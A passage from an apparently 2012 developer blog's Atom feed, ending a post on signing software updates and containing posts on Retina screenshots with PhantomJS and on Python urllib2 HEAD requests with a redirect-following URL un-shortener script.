<p><a href="https://gist.github.com/4340076">Here</a> are the instructions on how to generate your private and public keys and how to sign new updates. Don’t worry, it’s all really easy; if you happen to encounter any issues, shoot me a mail at <code>filippo.valsorda -&gt; gmail.com</code>!</p>

<p>I am sufficiently proficient only in Python, so if any C, Perl, PHP or Brainfuck guru wants to show up and contribute the same function in another language, it would be awesome!</p>

<p>Now you don’t have any excuses anymore (at least you Python devs): <strong>go signing your updates</strong>!<br />
(And maybe also <a href="https://www.twitter.com/FiloSottile">following me on Twitter</a>)</p>
]]></content>
    
  </entry>
  
  <entry>
    
      <title type="html"><![CDATA[Taking Retina screenshots with PhantomJS]]></title>
      <link href="http://filosottile.github.com/taking-retina-screenshots-with-phantomjs/"/>
    
    <updated>2012-05-12T16:44:00-04:00</updated>
    <id>http://filosottile.github.com/taking-retina-screenshots-with-phantomjs</id>
    
      <content type="html"><![CDATA[<p>With <a href="http://phantomjs.org">PhantomJS</a>, a headless WebKit browser with Javascript API, you can automatically render a webpage like you see it on your screen in an image or PDF. This is an awesome feature, useful for testing or - that’s what I use it for - rendering some elements of the page as images for later use.</p>

<p>Here I will explain how to take Retina-like screenshots. These are screenshots with double width and height for the same element where the details are rendered with double the precision. There are different reasons to want that: you might not own a new iPad or an iPhone4* and want to see how your website would look on these devices or you might want to add a Retina unit test to your awesome test stack. I want to render text to images so that they will still look sharp on Retina screens when used as replacements.</p>

<p>The key is the CSS3 <a href="http://www.w3schools.com/css3/css3_2dtransforms.asp"><code>transform</code></a> property and its <code>scale(2)</code> value, plus a couple of tweaks.
<!--more-->
Here is a modified version of the rasterize.js example to output Retina screenshots.</p>
<div><script src="https://gist.github.com/2667199.js?file=rasterize.js"></script>
<noscript><pre><code>var page = require('webpage').create(),
    address, output, size;

if (phantom.args.length &lt; 2 || phantom.args.length &gt; 3) {
    console.log('Usage: rasterize.js URL filename');
    phantom.exit();
} else {
    address = phantom.args[0];
    output = phantom.args[1];
    page.viewportSize = { width: 1280, height: 1024 };
    page.open(address, function (status) {
        if (status !== 'success') {
            console.log('Unable to load the address!');
        } else {
            page.evaluate(function () {
                /* scale the whole body */
                document.body.style.webkitTransform = &quot;scale(2)&quot;;
                document.body.style.webkitTransformOrigin = &quot;0% 0%&quot;;
                /* fix the body width that overflows out of the viewport */
                document.body.style.width = &quot;50%&quot;;
            });
            window.setTimeout(function () {
                page.render(output);
                phantom.exit();
            }, 200);
        }
    });
}</code></pre></noscript></div>

<h3 id="bonus">Bonus</h3>
<p>You might want to render only a single element, for example your content div or your always-buggy sidebar, to an image.<br />
Well, have a look at <a href="https://developer.mozilla.org/en/DOM/element.getBoundingClientRect"><code>element.getBoundingClientRect</code></a> (<a href="http://ejohn.org/blog/getboundingclientrect-is-awesome/">getBoundingClientRect is Awesome</a>) and PhantomJS <a href="https://github.com/ariya/phantomjs/wiki/API-Reference#wiki-webpage-clipRect"><code>page.clipRect</code></a>.</p>

<p>Here is a spoiler ;)</p>
<div><script src="https://gist.github.com/2667279.js?file=gistfile1.js"></script>
<noscript><pre><code>page.clipRect = page.evaluate(function() {
    return document.getElementById(ELEMENT_ID).getBoundingClientRect(); 
});</code></pre></noscript></div>

<h3 id="references">References</h3>
<ul>
  <li><a href="http://fcargoet.evolix.net/2012/01/use-phantomjs-to-take-screenshots-of-you-webapp-for-you/">Use PhantomJS to take screenshots of your webapp for you</a> - /home/florian</li>
  <li><a href="https://github.com/ariya/phantomjs/wiki/Screen-Capture">Rendering QuickStart example</a> - PhantomJs Wiki</li>
  <li><a href="https://github.com/ariya/phantomjs/wiki/API-Reference#wiki-webpage-render"><code>render()</code> API reference</a> </li>
</ul>

]]></content>
    
  </entry>
  
  <entry>
    
      <title type="html"><![CDATA[Send a HEAD request in Python]]></title>
      <link href="http://filosottile.github.com/send-a-head-request-in-python/"/>
    
    <updated>2012-03-18T17:53:00-04:00</updated>
    <id>http://filosottile.github.com/send-a-head-request-in-python</id>
    
      <content type="html"><![CDATA[<p>There are a lot of questions on this topic around the web and common answers are to use <code>httplib</code>, that however is a really-low level library, or to use <code>urllib2</code>, but a lot of people complains about it returning to <code>GET</code> if following a redirect.</p>

<p>Here is my <code>urllib2</code> solution, written looking at the code of <code>urllib2.HTTPRedirectHandler</code> and subclassing it in order to make it keep using the <code>HeadRequest</code>.</p>

<div><script src="https://gist.github.com/2077204.js?file=HEAD-request.py"></script>
<noscript><pre><code>import urllib2

class HeadRequest(urllib2.Request):
    def get_method(self):
        return &quot;HEAD&quot;

class HEADRedirectHandler(urllib2.HTTPRedirectHandler):
    &quot;&quot;&quot;
    Subclass the HTTPRedirectHandler to make it use our 
    HeadRequest also on the redirected URL
    &quot;&quot;&quot;
    def redirect_request(self, req, fp, code, msg, headers, newurl): 
        if code in (301, 302, 303, 307):
            newurl = newurl.replace(' ', '%20') 
            return HeadRequest(newurl, 
                               headers=req.headers, 
                               origin_req_host=req.get_origin_req_host(), 
                               unverifiable=True) 
        else: 
            raise urllib2.HTTPError(req.get_full_url(), code, msg, headers, fp)

# Build our opener with the HEADRedirectHandler
opener = urllib2.OpenerDirector() 
for handler in [urllib2.HTTPHandler, urllib2.HTTPDefaultErrorHandler,
                HEADRedirectHandler,
                urllib2.HTTPErrorProcessor, urllib2.HTTPSHandler]:
    opener.add_handler(handler())

response = opener.open(HeadRequest(url))

print response.geturl()
print response.info()</code></pre></noscript></div>

<p>For example, here is a fast URL un-shortener (redirect follower) realized with the method above (and a fallback).</p>

<div><script src="https://gist.github.com/2077115.js?file=redirect-follower.py"></script>
<noscript><pre><code>#!/usr/bin/env python
#-*- coding:utf-8 -*-

import sys
import urllib2

# This script uses HEAD requests (with fallback in case of 405) 
# to follow the redirect path up to the real URL
# (c) 2012 Filippo Valsorda - FiloSottile
# Released under the GPL license

class HeadRequest(urllib2.Request):
    def get_method(self):
        return &quot;HEAD&quot;

class HEADRedirectHandler(urllib2.HTTPRedirectHandler):
    &quot;&quot;&quot;
    Subclass the HTTPRedirectHandler to make it use our 
    HeadRequest also on the redirected URL
    &quot;&quot;&quot;
    def redirect_request(self, req, fp, code, msg, headers, newurl): 
        if code in (301, 302, 303, 307):
            newurl = newurl.replace(' ', '%20') 
            newheaders = dict((k,v) for k,v in req.headers.items()
                              if k.lower() not in (&quot;content-length&quot;, &quot;content-type&quot;))
            return HeadRequest(newurl, 
                               headers=newheaders,
                               origin_req_host=req.get_origin_req_host(), 
                               unverifiable=True) 
        else: 
            raise urllib2.HTTPError(req.get_full_url(), code, msg, headers, fp) 
            
class HTTPMethodFallback(urllib2.BaseHandler):
    &quot;&quot;&quot;
    Fallback to GET if HEAD is not allowed (405 HTTP error)
    &quot;&quot;&quot;
    def http_error_405(self, req, fp, code, msg, headers): 
        fp.read()
        fp.close()

        newheaders = dict((k,v) for k,v in req.headers.items()
                          if k.lower() not in (&quot;content-length&quot;, &quot;content-type&quot;))
        return self.parent.open(urllib2.Request(req.get_full_url(), 
                                         headers=newheaders, 
                                         origin_req_host=req.get_origin_req_host(), 
                                         unverifiable=True))

# Build our opener
opener = urllib2.OpenerDirector() 
for handler in [urllib2.HTTPHandler, urllib2.HTTPDefaultErrorHandler,
                HTTPMethodFallback, HEADRedirectHandler,
                urllib2.HTTPErrorProcessor, urllib2.HTTPSHandler]:
    opener.add_handler(handler())

response = opener.open(HeadRequest(sys.argv[1]))

print response.geturl()</code></pre></noscript></div>

]]></content>
    
  </entry>
  
</feed>
